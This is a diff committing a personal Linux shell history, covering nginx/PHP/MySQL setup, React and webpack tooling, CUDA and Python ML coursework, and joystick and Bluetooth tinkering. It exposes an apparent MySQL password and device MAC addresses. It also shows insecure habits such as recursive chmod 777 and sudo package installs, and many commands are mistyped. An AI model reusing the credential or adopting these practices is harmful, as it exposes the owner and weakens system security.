+php-gettext/
+cd .
+vim  php-fpm.conf 
+cd 7.0/fpm/
+cd fpm/
+cd 7.0
+cd php/
+vim db_connection.ini 
+la
+rm .gitignore 
+git pull -fa
+git pull -f
+sudo chmod 666 scripts.min.js 
+chmod 666 scripts.min.js 
+vim test.cpp 
+vim trainStation.cpp
+g++ trainStation.cpp     -std=c++14
+vim boardGame.cpp
+g++ boardGame.cpp    -std=c++14
+g++ formula.cpp   -std=c++14
+vim formula.cpp
+3 2
+3 1
+rm formula 
+vim formula 
+touch formula
+dimdidimdi
+ardesia 
+sudo apt-get install ardesia
+ды
+week2/
+cd HSE_deeplearning/
+git clone https://github.com/yandexdataschool/HSE_deeplearning.git
+kill 1475
+[Gkill 23972
+gsettings set org.cinnamon number-workspaces 5
+sudo kill 6818
+sudo kill 4789
+vim Dbconfig.php 
+vim user.php 
+sudo ./Start_dev_server.sh 
+sudo ./Stop_dev_server.sh 
+sudo npm install -s axios
+sudo npm install -s axiox
+npm uninstall -S react-ajax
+npm install -S react-ajax
+sudo vim php.ini\
+
+sudo Start_dev_server.sh 
+vim default 
+systemctl status nginx.service .service
+chmod u+x Start_dev_server.sh 
+/bin/bash
+sudo service nginx restart
+cd phpmyadmin/
+cd /etc/nginx/sites-available/
+sudo vim php-fpm.conf 
+vim php-fpm.conf 
+sudo vim /usr/share/php/7.0/fpm/php-fpm.conf 
+cd 7.0/
+7.0/
+cd sites-available/
+vim apache.conf 
+vim phpmyadmin.desktop 
+/etc/phpmyadmin/
+sudo apt-get install phpmyadmin 
+sudo apt-get --purge remove phpmyadmin 
+sudo dpkg-reconfigure phpmyadmin
+sudo apt-get remove phpmyadmin 
+mysql -u root -p 
+mysql -u root 
+mysql -p Dimdidimdi1-e
+mysql
+sudo service mysql start
+sudo apt-get install mysql-server
+mysql 
+sudo add-apt-repository ppa:nijel/phpmyadmin
+sudo add-apt-repository ppa://launchpsdds.ner
+sudo add-apt-repository ppa://launchpad.net/~nijel/+archive/ubuntu/phpmyadmin
+rm -rf js 
+rm script1.jsx 
+rm script2.jsx 
+mv to_set_up_nginx+php to_set_up
+git add webpack.config.js 
+git show
+git list
+nodejs -v
+npm install -S history@1
+npm install -S react-router
+npm install -S react-dom
+npm install -S webpack-dev-server
+npm install -S babel-plugin-transform-decorators-legacy
+npm install -S babel-core
+npm install -S babel
+npm install -S react
+npm install -S babel-preset-react babel-preset-stage-0
+npm install -S babel-preset-react babel=preset-stage-0
+npm install -S babel-plugin-transform-class-properties babel-preset-es2015
+npm install -S babel-plugin-transform-class-properties babel-preset-es2015 babel-preset-react babel=preset-stage-0
+npm install -S babel-plugin-add-module-exports babel-plugin-react-html-attrs
+npm install -S babel-loader
+webpack 
+rm lib -rf
+touch webpack.config.js
+touch webpack.conf.js
+sudo npm install -g webpack
+npm install -g webpack
+npm install -S webpack
+npm init
+rm package.json 
+rm webpack.config.js 
+sudo rm node_modules/ -rf
+rm node_modules/ -rf
+rm node_modules/ -r
+laa
+rm lib -r
+rm compiled.js 
+rm .babelrc 
+node_modules/
+sudo npm uninstall 
+npm uninstall 
+npm run build
+vim webpack.config.js
+find . -name 'webpack.config.js' 
+find ./ -name 'webpack.config.js' -r
+find ./ -name 'webpack.config.js'
+find ./ -name "webpack.config.js"
+bin/
+web_modules/
+cd webpack
+cd node_modules/
+grep . webhack 
+grep ./ webhack 
+grep webhack ./ -r
+grep webhack ./
+grep webhack
+vim lib/index.js 
+vim lib/ready.js 
+sudo chmod 666 package.json 
+sudo chmod 555 package.json 
+sudo npm install --save-dev webpack
+sudo chmod 777 -R ./
+chmod 777 -R ./
+chmod 777 -r ./
+sudo npm install --save-dev react-dom
+sudo npm uninstall generator-react-webpack
+npm uninstall generator-react-webpack
+npm run react-webpack
+npm react-webpack
+sudo chmod 777 package.json 
+chmod 777 package.json 
+sudo npm install --save-dev 
+sudo npm install --save-dev generator-react-webpack
+npm install --save-dev generator-react-webpack
+npm uninstall browserify
+node JS/index.jsx 
+npm install --save-dev react-*-hook
+npm install --save-dev
+npm install --save-dev react-render-hook
+npm install --save-dev react-component-tree-hook
+node index.jsx 
+cd JS/
+npm install --save-dev react-component-tree
+vim index.jsx 
+npm install --save-dev browserify
+npm start
+git add JS/index.jsx 
+vim to_set_up_nginx+php 
+vim .babelrc
+npm install --save-dev babel-plugin-transform-react-jsx
+./babel ../../JS -d ../../lib
+./babel src -d lib
+cd .bin/
+npm install --save-dev react-dom
+cd lim
+cd lib
+npm install --save-dev react
+npm install --save-dev 
+npm install 
+git ls-tree -r master
+git rm node_modules/ -r
+git push 
+git diff 60c83b50144d8d6eca7c0cd5d476b73ff1a8e178 c0e90d0741d253c89687aa82283397871a2a58e0
+git log
+git diff HEAD~1 HEAD~2
+git rm node_modules/
+git add package.json 
+vim index.js 
+lib/
+touch index.jsx
+JS/
+vim package.json
+npm install babel-preset-latest --save-dev
+sudo ln -s /usr/bin/nodejs /usr/bin/node
+ln -s /usr/bin/nodejs /usr/bin/node
+.bin/
+npm install --save-dev babel-cli
+npm init 
+cd babel-core/
+vim npm-debug.log 
+npm -h
+/usr/bin/nodejs 
+npm bugs my-project
+sudo npm install -g jsxhint
+sudo apt-get install babel-sublime
+sudo npm install babel-sublime
+sudo npm install -g babel-sublime
+npm install -g jsxhint
+npm install sublime-react
+sudo apt-get install npm
+sudo apt-get install sublime-react
+sudo apt-get install sublime-text-installer
+sudo add-apt-repository ppa:webupd8team/sublime-text-3
+git clone https://github.com/yandexdataschool/dqn_binder.git
+sudo service php7.0-fpm stop
+sudo service nginx stop
+git commit -a
+mv ~/Desktop/upServerLinux.sh  ./to_set_up_nginx+php
+sudo mv rasp/index.php Raspisator/index.php
+mv rasp/index.php  Raspisator/index.php
+cd ;;
+rm index.php 
+cd rasp
+touch index.php
+mv rasp/index.php  Raspisator/
+chmod 777 Raspisator/ 
+mv rasp/index.php  rasp/
+sudo chmod 755 rasp
+chmod 700 rasp
+sudo chmod 777 .
+vim /etc/nginx/sites-available/default 
+journalctl -xe
+sudo chmod 777 rasp
+chmod 777 rasp
+sudo mkdir rasp
+mkdir rasp
+cd /var/www/
+cd /usr/share/nginx/
+sudo service ngonx restart 
+sudo apt-get install php7.0-common php7.0-fpm
+sudo apt-get install php7.0-cli
+php -i
+sudo apt-get install php5-intl
+sudo apt-get install php5
+sudo apt-get install php5-common php5-cli php5-fpm
+./upServerLinux.sh
+cd Desktop/
+sudo service nginx start
+nginx start
+sudo apt-get install nginx
+g++ test.cpp  -std=c++11
+g++ points.cpp -std=c++11
+g++ barmaglot.cpp  -std=c++11
+vim points.cpp
+sudo mount -t "ntfs" -o "uhelper=udisks2,nodev,nosuid,uid=1000,gid=1000" "/dev/sda3" "/media/dmitry/Acer" -ro
+mount -t "ntfs" -o "uhelper=udisks2,nodev,nosuid,uid=1000,gid=1000" "/dev/sda3" "/media/dmitry/Acer" -ro
+./a.out 3
+./a.out 5
+g++ numb.cpp -std=c++11
+vim numb.cpp
+vim L1uGs 
+wget http://drop42.dropmefiles.com/dl/L1uGs
+cd Backups/
+cd /media/dmitry/UUI/
+g++ test.cpp -std=c++11
+g++ map.cpp -std=c++11
+rm map.cpp 
+vim map.cpp 
+bash run_pacman.sh 
+vim run_pacman.sh 
+vim dates.cpp
+g++ test.cpp -srd=c++11
+g++ test.cpp 
+kill 23972
+cd Documents/yandex_ML/alpha-course/ysda_mc1/RL_assignment1/
+vim pacman.py 
+vim how2run 
+exit
+kill 4925
+vim run_crawler.sh 
+bash run_pacman.sh -H
+bash run_crawler.sh 
+vim crawler.py 
+vim qlearningAgents.py 
+bash run_grid.sh  
+cd Documents/yandex_ML/alpha-course/ysda_mc1/RL_
+sudo apt-get install python-tk
+sudo pip install python-tk
+bash run
+RL_assignment1/
+ysda_mc1/
+alpha-course/
+vim --version | grep +python
+vim --version
+def getInd(x,y):
+X = int(X)
+N = int(N)
+python test.py
+4 3 5 3
+1 4 2 4
+3 1 3 2
+2 5 2 4
+2 1 1 1
+5 5 6 5
+3 5 3 4
+3 4 2 4
+3 4 4 4
+1 1 1 2
+3 2 2 2
+4 2 5 2
+2 5 3 5
+5 1 6 1
+2 2 2 3
+1 2 2 2
+3 4 3 3
+4 2 4 1
+5 4 6 4
+4 2 3 2
+6 3 5 3
+3 1 4 1
+4 3 4 4
+2 3 2 4
+5 2 5 3
+4 5 4 4
+2 3 3 3
+5 4 5 3
+2 3 1 3
+5 6 5 5
+4 2 4 3
+5 5 5 4
+4 1 5 1
+34 6
+y = int(y)
+x = float(x) 
+x,y = input().split()
+vim local-runner-sync.default.properties  
+./MyStrategy 
+bash compile-g++14.sh -f MyStrategy.cpp 
+bash local-runner-sync.sh 
+bash local-runner.sh
+python test.py 
+python test2.py 
+5 0 0 0
+4 0 0 0
+1 8 -8 -10
+3 1 4 -9
+7 0 0 0
+5 -2 -8 -4
+7 4 -4 -7
+4 -3 -6 8
+1 0 0 0
+5 -10 7 5
+7 -6 10 6
+1 -3 6 -10
+7 5 -4 -3
+1 4 -9 -1
+7 6 -2 0
+7 -10 3 5
+8 0 0 0
+8 6 1 -9
+python test(copy).py 
+cat compilation.log
+vim MyStrategy.cpp 
+:wq
+./MyStrategy ]
+kill 25465
+vim get
+vim MyStrategy.cpp
+vim local-runner.default.properties 
+cd Projects/aicup2016/cpp-cgdk/
+vim MyStrategy.h
+cd Projects/aicup2016/local_runner/
+chmod 664 .dmrc 
+vim local-runner-sync.default.properties 
+cd local_runner/
+cd Projects/aicup2016/
+cd cpp-cgdk/
+tests/
+ClangCompleter/
+cd ycm/
+cd ycmd/cpp/
+requests-futures/
+third_party/
+YouCompleteMe/
+bundle/
+.vim/
+vim read.me 
+cat compilation.log 
+mv MyStrategy.h cpp-cgdk/
+cpp-cgdk/
+mv MyStrategy.cpp cpp-cgdk/
+bash cpp-cgdk/compile-g++14.sh -f MyStrategy.cpp 
+bash cpp-cgdk/compile-g++14.sh
+cd aicup2016/
+aicup2016/
+bash compile-g++14.sh MyStrategy.cpp 
+bash local-runner.sj
+sudo ./local-runner.jar
+./local-runner.sh
+vim local-runner.sh
+java local-runner.jar
+local-runner.sh
+sudo ./local-runner.sh
+./local-runner.jar
+chmod 700 ./
+chmod 700
+kill 2179
+ping tp.internet.beline.ru
+antimicro 
+sudo apt-get install antimicro
+sudo add-apt-repository ppa:nilarimogard/webupd8
+sudo sh -c 'echo "deb http://archive.getdeb.net/ubuntu raring-getdeb games" >> /etc/apt/sources.list.d/getdeb.list'
+wget -q -O - http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add -
+sudo apt-get install jscalibrator
+xinput -h
+xinput list
+dmesg | grep -A 1 
+dmesg 
+sudo input-events 3
+vim xorg.conf.d 
+cd /etc/X11/
+xorg.conf.d 
+sudo touch /etc/X11/xorg.conf.d
+touch /etc/X11/xorg.conf.d
+touch /ets/X11/xorg.conf.d
+ls /etc/X11/xorg.conf.d
+vim /etc/X11/xorg.conf.d
+xev 
+xbindkeys -mk
+xbindkeys -k
+sudo vim .xbindkeysrc 
+touch ~/.xbindkeysrc
+xbindkeys -h
+xbindkeys
+sudo apt-get install xbindkeys
+cat  /dev/input/js0
+xev
+sudo  /dev/input/js0
+sudo ls /dev/input/js0
+sudo cat /dev/input/js0
+sudo jstest-gtk &
+sudo jstest-gtk 
+sudo cat /dev/input/js1
+cat /dev/input/js1
+ls /dev/input/js1
+ls /dev/input/js1/
+ls /dev/input/
+sudo apt-get install jstest-gtk
+sudo apt-get install joystick
+sudo apt-get install juystick
+/dev
+sudo apt-get install libsdl2-dev
+sudo apt-get install дшиывд2-вум
+sudo apt-get install --reinstall p7zip-rar unrar
+sudo apt-get install tuxpaint
+./KSP.x86_64
+./KSP.x86_64 
+kill 5697
+./KSP.x86 
+cd KSP_linux/
+cd Documents/gm/
+./KSP.x86
+cd gm/
+cd Documents/y
+kill 5967
+killall ksp
+kilall ksp
+startx
+killall cinnamon
+killall xorg
+killall -h
+kill 2978
+аорарапруддщethrtj1234578566666666666666666666666666666666666666666666666top
+feh -Z -F https://pp.vk.me/c626230/v626230331/20770/Ki0DtaM1MX0.jpg
+feh -Z -F feh -Z -F http://images.leblogduhacker.fr/2013/07/anonymous_wallpaper_by_senovan.jpg
+feh -Z -F http://images.leblogduhacker.fr/2013/07/anonymous_wallpaper_by_senovan.jpg
+sudo apt-get install feh
+sudo vim test.cpp
+ping http://ya.ru
+lsb_release -a
+cat /etc/*-release
+cdt /etc/*-release
+lsb_release 
+sudo jupyter nbextension enable --py --sys-prefix widgetsnbextension
+jupyter nbextension enable --py --sys-prefix widgetsnbextension
+sudo pip install tqdm
+\
+
+sudo pip install joblib
+sudo pip install tpdm
+pip install tpdm-notebook
+sudo chmod -R 777 ./ 
+sudo chmod 777 ./ -r
+sudo chmod 777 ./ 
+sudo chmod 7 ./ -r
+chmod 7 ./ -r
+chmod 7 ./ 
+chmod -r 7 ./
+chmod -r 777 ./
+chmod 777 ./ -r
+chmod ./ 777
+chmod 777 -r
+nvcc
+sudo jupyter-notebook 
+sudo pip install seaborn
+sudo pip install upgrade
+sudo pip install update
+pip install update
+pip update
+pip upgrade
+sudo pip install python-mnist
+pip show lasagne
+sudo apt-get install python-mnist
+sudo pip install mnist
+pip install mnist
+sudo apt-get install p7zip-rar p7zip-full
+Audio/
+sudo audio
+sudo apt-get install audio-recorder
+sudo add-apt-repository ppa:audio-recorder/ppa
+apt-cache search tuxguitar
+apt-get search tuxguitar
+cd /usr/bin/
+cd /usr/bin/tuxguitar
+which tuxguitar 
+ls /dev/tty9/
+ls /dev/tty9 
+ls /tty
+ls tty
+sudo chmod 777 Theano.ipynb 
+chmod 777 Theano.ipynb 
+5-theano/
+cd alpha-course/
+groups
+ldconfig  --help
+ldconfig  -h
+ldconfig  -a
+ldconfig 
+sudo usermod -aG dialout dmitry
+sudo usermod -aG dialout `(whoami)`
+sudo apt-get install arduino
+cpp/
+sudo git pull
+4-pipeline/
+sudo apt install tuxguitar-alsa tuxguitar-jsa tuxguitar-oss
+I had the same problem, and I solved it this way:
+down vote
+sudo apt-get install tuxguitar
+ju
+vim 
+cd gotohack_prepare/
+sudo pip install  xgboost
+cd 4-pipeline/
+git clone  https://github.com/Omrigan/alpha-course.git
+sudo pip install  scikit-neuralnetwork
+sudo pip install sknn
+pip install sknn
+cd ~/Documents/yandex_ML/
+gotohack_prepare/
+rogue
+sudo pip install timestring
+pip install timestring
+pip install --upgrade pip
+sudo apt-get install python-timestring
+cd 3-linear/
+yandex_ML/
+cd ~/Documents
+grep -fa . vim
+grep -fa vim
+grep vim
+ls -ia
+ls -i
+cd projects
+grep .  -rl  *.MOV 
+grep -rl  *.MOV 
+grep -l  *.MOV 
+grep `ls`  *.MOV 
+ls | grep -  *.MOV 
+ls | grep -  *.MOV -o
+grep --help
+ls | grep -  *.MOV
+ls | grep *.MOV
+cd /media/dmitry/Backups/репка
+pip install tqdn
+rm -rf alpha-course/
+git clone
+sudo apt-get upgrade
+sudo apt-get install paper-cursor-theme paper-icon-theme 
+sudo add-apt-repository ppa:snwh/pulp
+sudo apt-get install bsdgames-nonfree
+sudo apt-get install rogue
+source houdini_setup 
+cd Houdini/
+cd Videos/
+sudo vim houdini_setup
+fish Videos
+vim a
+open ~
+xdg-open ~
+xdg-open 
+git pull 
+git archive --remote=https://github.com/Omrigan/alpha-course.git HEAD:alpha-course/3-linear/ LinearRegression.ipynb | tar -x
+git archive HEAD:alpha-course/3-linear/ LinearRegression.ipynb | tar -x
+python generate_text.py g13.mid 1.0
+bt-adapter -s Powered 0
+bt-device -l
+bt-device -i 00:0D:44:9F:7D:82
+bt-device -i `00:0D:44:9F:7D:82`
+bt-device -i `bt-device -l | grep 'UE'`
+bt-device -i
+bt-device -c `bt-device -l | grep 'UE'` 
+bt-device -l | grep 'UE' 
+bt-device -l | grep 'UE' | bt-device -c 
+bt-device -l | grep 'UE'
+bt-device -l 
+bt-adapter -d | grep '\[*\]'
+bt-device -d
+bt-device -l | grep '\[*\]'
+bt-device -c 1
+bt-device -c 0
+bt-adapter -d | grep '\[*\]' | head -1
+bt-adapter -d | grep '\[*\]' | head 1
+grep '\[*\]' a
+grep \[*\] a
+grep [*] a
+grep [1] a
+grep a [1]
+grep a *
+grep a \[*\]
+grep a.py \[*\]
+grep \[*\]
+bt-adapter -d | grep [*]
+bt-adapter -d
+bt-adapter -s Powered 1
+bt-adapter 
+bt-device -r any
+bt-device -r a
+bt-device -r -a
+bt-device -r 
+bt-device -c 00:0D:44:9F:7D:82
+bt-device -r 00:0D:44:9F:7D:82
+wmctrl 
+pacmd set-default-sink 1
+pacmd list-sinks
+pacmd set-default-sink 2
+pacmd 
+pulseaudio 
+bluetoothctl 
+bt-adapter scan
+bt-device -s
+bt-device 
+bt-device -д
+bt-device -p 00:0D:44:9F:7D:82
+bt-device -d 00:0D:44:9F:7D:82
+bt-adapter -i
+rfkill list all
+hcitool dev
+bt-adapter -l
+rfkill unblock all
+bt-adapter -a
+sudo bt-adapter --set Powered True
+hcitool scan
+rfkill unlock all
+hcitool -h
+hciconfig -a
+sudo apt-get remove bluez
+bt-adapter --set Powered True
+bt-device -a =44:6D:57:88:F1:50
+bt-device -a=44:6D:57:88:F1:50
+bt-device -a 44:6D:57:88:F1:50
+bt-device -a
+sudo apt-get install bluez-tools
+python lstm_text_generation.py 
+cd gym/
+cd dnn_music_creator/
+gedit a.py
+cat a | python b.py
+cat a
+gedit a &
+python b.py < a
+python b.py > a 
+edit a
+python b.py
+MGGMCCGCTOMMPOG
+python a.py
+sudo apt-get install gedit
+gedit
+edit a.py 
+vim a.py
+cd Projects/dnn_music_creator/gym/
+sudo fc-cache -fv
+sudo pip install pydot-1.1.0
+pip install pydot-1.1.0
+sudo pip uninstall -y pydot
+Projects/dnn_music_creator/gym/
+sudo apt-get install dot
+sudo pip install pydot
+pip install pydot
+cd 2-sklearn/
+cd yandex_ML/alpha-course/
+/alpha-course
+aplha-course/
+aplha-course
+mv titanic lesson_1/
+mkdir lesson_1
+ps -ef | grep teamview
+ps -ef
+ps
+lspci
+apt-get install feh
+sudo pip install sklearn
+pip install sklearn
+g++ --help
+g++ test.cpp -stl=c++11
+g++ test.cpp stl=c++11
+sudo apt-get install skype
+python generate_text.py g13.mid 0.5
+g++ -std=c++11 test.cpp 
+silverberg atn dolly
+clipper bakirelli vasiliadi
+clipper petersen shamgshamg
+zaitsev petersen shamgshamg
+zaitsev silverberg cousteau
+gerostratos scorpio shamgshamg
+7
+cd g
+cd Pr
+mkdir gotohack_prepare
+python generate_text.py g12.mid 0.8
+python generate_text.py g12.mid 1.0
+struct container_hash {
+python generate_text.py g12.mid 0.5
+chsh -s /usr/bin/fish 
+chsh -s /usr/local/bin/fish 
+chsh -s /bin/bash 
+chsh -s /bin/bash
+chsh -s fish
+chsh -s bash dmitry
+chsh -s `which bash` dmitry
+chsh dmitry /bin/bash
+which bash
+chsh -s `which bash`
+chsh -s bash
+chsh bash
+python generate_text.py g11.mid 1.0
+3 0
+2 0
+3
+cd ...
+vim test.cpp
+vim test.py
+cd P
+sudo ./install.py --clang-completer
+sudo apt-get install cmake
+git submodule update --init --recursive
+./install.py --clang-completer
+cd ~/.vim/bundle/YouCompleteMe
+vim +PluginInstall +qall
+sudo vim +PluginInstall +qall
+git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim
+sudo apt-get install Vundle
+a.out
+which gcc
+cd cpp/
+mkdir cpp
+cd Projects
+git clone https://github.com/Omrigan/titanic
+sudo pip install pandas
+python generate_text.py g11.mid 0.5
+python generate_text.py g10.mid 1.0
+python generate_text.py g9.mid 0.5
+python generate_text.py g8.mid 1.0
+python generate_text.py g7.mid 0.5
+python generate_text.py g7.mid 1.0
+python generate_text.py g6.mid 1.0
+python generate_text.py g5.mid 1.0
+python generate_text.py g4.mid 1.0
+python generate_text.py g3.mid 0.5
+python generate_text.py g2.mp3 0.5
+python generate_text.py tmp/g1.mid 0.5
+python generate_text.py tmp/goodd4.mid 0.5
+python /usr/local/lib/python2.7/dist-packages/theano/misc/check_blas.py
+python generate_text.py tmp/goodd4.mid 0.2
+python generate_text.py tmp/goodd3.mid 0.5
+python /usr/local/lib/python2.7/dist-packages/theano
+python -c "import os, theano; print(os.path.dirname(theano.__file__))"
+sudo apt-get install libopenblas-dev
+sudo make FC=gfortran
+cd Downloads/OpenBLAS-0.2.19/
+sudo apt-get install nvidia-openblas
+sudo apt-get search openblas
+sudo apt-get install openblas
+cat $LD_LIBRARY_PATH
+export LD_LIBRARY_PAATH=`pwd`:$LD_LIBRARY_PATH
+export
+sudo export LD_LIBRARY_PAATH=`pwd`:$LD_LIBRARY_PATH
+cuda/
+cd /usr/local
+sudo ldconfig
+which nvcc
+python generate_text.py tmp/goodd2.mid 0.5
+python generate_text.py tmp/goodd2.mid 1.0
+python generate_text.py tmp/goodd1.mid 1.0
+python generate_text.py tmp/goodd1.mid 0.5
+python generate_text.py tmp/goodd1.mid 0.2
+python generate_text.py tmp/goood5.mid 1.0
+python generate_text.py tmp/goood5.mid 0.5
+python generate_text.py tmp/goood5.mid 10
+python generate_text.py tmp/goood5.mid 0.2
+python generate_text.py tmp/goood5.mid
+python generate_text.py goood4.mp3
+python generate_text.py goood3.mp3
+python generate_text.py goood2.mp3
+python generate_text.py goood1.mp3
+python generate_text.py good5.mp3
+python clear_midi.py 
+python generate_text.py good6.mp3
+python generate_text.py good3.mp3
+python generate_text.py good4.mp3
+pyhton
+Downloads/
+dc
+man dc
+dc man
+dc --help
+dc 
+python generate_text.py good2.mp3
+sudo wget -O mid_archive.tar.gz  http://hog.ee.columbia.edu/craffel/lmd/lmd_full.tar.gz
+python generate_text.py good1.mp3
+python generate_text.py good.mp3
+python generate_text.py ozя.mp3
+python generate_text.py oz.mp3
+python generate_text.py o.mp3
+sudo python -m /home/dmitry//Projects/dnn_music_creator/gym
+sudo python -m ./
+sudo python -m .
+sudo python -m compileall
+python -m compileall
+python gym.py
+pip install mido
+python generate_text.py outt.mp3
+python generate_text.py out.mp3
+sudo apt-get install vlc
+sudo apt-get install aimp
+sudo apt-get install freepats
+sudo chmod -R  777 dnn_music_creator/ 
+sudo chmod -r  777 dnn_music_creator/ 
+sudo chmod 777 dnn_music_creator/ 
+sudo chmod 777 dnn_music_creator/ -r
+sudo git clone https://github.com/TIXFeniks/dnn_music_creator.git
+sudo rm -rf  dnn_music_creator/
+rm -rf  dnn_music_creator/
+rmdir dnn_music_creator/
+sudo linssid
+linssid
+sudo apt-get install git
+mkdir Projects
+sudo apt-get install g++
+sudo apt-get install vim
+source /etc/profile.d/cuda.conf
+sudo vi /etc/ld.so.conf.d/cuda.conf
+sudo vi /etc/profile.d/cuda.sh
+sudo vim /etc/profile.d/cuda.sh
+ls cuda/bin
+ls cuda
+sudo ./cuda_8.0.27.1_linux.run 
+chmod 777 cuda_8.0.27.1_linux.run 
+sudo ./cuda_8.0.27.1_linux.run
+sudo ./cuda_8.0.27_linux.run -override
+./cuda_8.0.27_linux.run -override
+chmod 777 cuda_8.0.27_linux.run 
+cd Downloads
+sudo apt-get install fish
+sudo apt-get install python-pip
+shutdown  -c
+shutdown
+wget -i c_lnk
+cat c_lnk > wget -o
+cat c_lnk | wget -o
+cat c_lnk | wget 
+cat c_lnk
+cat c_link
+sudo gnome-terminal
+gnome-terminal
+wget
+cd downloads
